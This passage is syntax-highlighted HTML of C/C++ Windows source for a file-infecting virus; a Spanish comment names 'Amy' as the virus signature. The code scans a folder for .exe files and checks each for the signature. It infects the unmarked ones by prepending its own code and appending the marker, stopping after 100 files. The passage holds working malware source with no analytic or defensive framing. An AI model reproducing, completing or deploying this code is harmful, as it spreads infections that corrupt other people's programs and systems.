           </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Dec</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">--;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> 
           </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">  
           </span><span class="sc11">putc</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0"> 
        </span><span class="sc10">}</span><span class="sc0"> 
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">Delete_</span><span class="sc10">(</span><span class="sc11">File</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc11">MoveFile</span><span class="sc10">(</span><span class="sc11">OutputFile</span><span class="sc10">,</span><span class="sc11">File</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">fileexists</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">meat</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Handy</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">Handy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">meat</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
                           </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0"> 
                           </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">Handy</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">Handy</span><span class="sc10">)</span><span class="sc0"> 
 </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMyCode</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Me</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">rid</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">Me</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">AmyName</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">MSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AmySize</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc11">MContent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPSTR</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GPTR</span><span class="sc10">,</span><span class="sc11">MSize</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">MContent</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">

                                </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc0">
                                        </span><span class="sc11">Me</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">MContent</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">MSize</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc10">&amp;</span><span class="sc11">rid</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc10">}</span><span class="sc0">
                                         </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">Me</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                        


</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CheCk</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">ToCheck</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">rid</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">Bytez</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">Firm</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">FileStatuz</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        

        </span><span class="sc11">ToCheck</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ToCheck</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

                                </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">ToCheck</span><span class="sc10">,-</span><span class="sc4">3</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">FILE_END</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">Firm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPSTR</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GPTR</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">Firm</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc0">
                                        </span><span class="sc11">ToCheck</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">Firm</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc10">&amp;</span><span class="sc11">rid</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                         </span><span class="sc10">}</span><span class="sc0">
            
                                        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">ToCheck</span><span class="sc10">);</span><span class="sc0">

                
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fIrm</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">fIrm</span><span class="sc10">,</span><span class="sc11">Firm</span><span class="sc10">,</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">fIrm</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">fIrm</span><span class="sc10">,</span><span class="sc6">"Amy"</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc2">// Amy = Firma del virus
</span><span class="sc0">                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">FileStatuz</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                
                </span><span class="sc11">VirtualFree</span><span class="sc10">(</span><span class="sc11">Firm</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">MEM_RELEASE</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">VirtualFree</span><span class="sc10">(</span><span class="sc11">fIrm</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">MEM_RELEASE</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileStatuz</span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ReConstructCell</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">freshmeat</span><span class="sc10">[],</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">Org</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">EcDec</span><span class="sc10">(</span><span class="sc11">freshmeat</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Sleep(500);
</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc11">Me</span><span class="sc10">,</span><span class="sc11">VxD</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">VSize</span><span class="sc10">,</span><span class="sc11">VxDSize</span><span class="sc10">,</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc11">rid</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">VContent</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">FirM</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">srand</span><span class="sc10">((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RandomName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">tmpfol</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomStr</span><span class="sc10">(</span><span class="sc11">Random</span><span class="sc10">(</span><span class="sc4">30</span><span class="sc10">)));</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">RandomExt</span><span class="sc10">());</span><span class="sc0">
   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">Org</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">RandomName</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">FirM</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Amy"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc11">Victim</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">freshmeat</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">VSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc0">
                                                    </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">VContent</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPSTR</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">GPTR</span><span class="sc10">,</span><span class="sc11">VSize</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">VContent</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">

                                </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc0">
                                        </span><span class="sc11">Victim</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">VContent</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc11">VSize</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc10">&amp;</span><span class="sc11">rid</span><span class="sc10">,</span><span class="sc0">
                                        </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                        </span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">Again</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">VxDfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RandomName</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fileexists</span><span class="sc10">(</span><span class="sc11">VxDfile</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">Again</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VxD</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">VxDfile</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0">
                 </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">VxD</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc0">
                                </span><span class="sc11">VxD</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">MContent</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">MSize</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc10">&amp;</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc0">
                                </span><span class="sc11">VxD</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">VContent</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">VSize</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc10">&amp;</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc0">
                                </span><span class="sc11">VxD</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc11">FirM</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc10">&amp;</span><span class="sc11">writ</span><span class="sc10">,</span><span class="sc0">
                                </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc10">}</span><span class="sc0">
                              </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">Victim</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">VxD</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">VxDfile</span><span class="sc10">,</span><span class="sc11">freshmeat</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">Delete_</span><span class="sc10">(</span><span class="sc11">VxDfile</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                          </span><span class="sc2">//      Sleep(3000);
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">



</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">Zeek</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc11">param</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">Gooooogle</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp_</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ToFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Counter</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_</span><span class="sc10">,</span><span class="sc11">SeekTarget</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp_</span><span class="sc10">,</span><span class="sc6">"*.exe"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">ToFind</span><span class="sc10">,</span><span class="sc11">temp_</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Gooooogle</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">ToFind</span><span class="sc10">,&amp;</span><span class="sc11">Data</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Gooooogle</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">SeekTarget</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CheCk</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">))</span><span class="sc0">
                                                  
                        </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">ReConstructCell</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Counter</span><span class="sc10">++;</span><span class="sc0">
                               </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">Gooooogle</span><span class="sc10">,&amp;</span><span class="sc11">Data</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">temp</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">target</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">SeekTarget</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">temp</span><span class="sc10">,</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">temp</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CheCk</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">))</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">ReConstructCell</span><span class="sc10">(</span><span class="sc11">target</span><span class="sc10">,</span><span class="sc11">Data</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Counter</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Counter</span><span class="sc10">==</span><span class="sc4">100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">PAfuera</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">PAfuera</span><span class="sc10">:</span><span class="sc0">
                </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">Gooooogle</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SeekAndFoundT</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc10">[])</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">SeekTarget</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">folder</span><span class="sc10">;</span><span class="sc0">
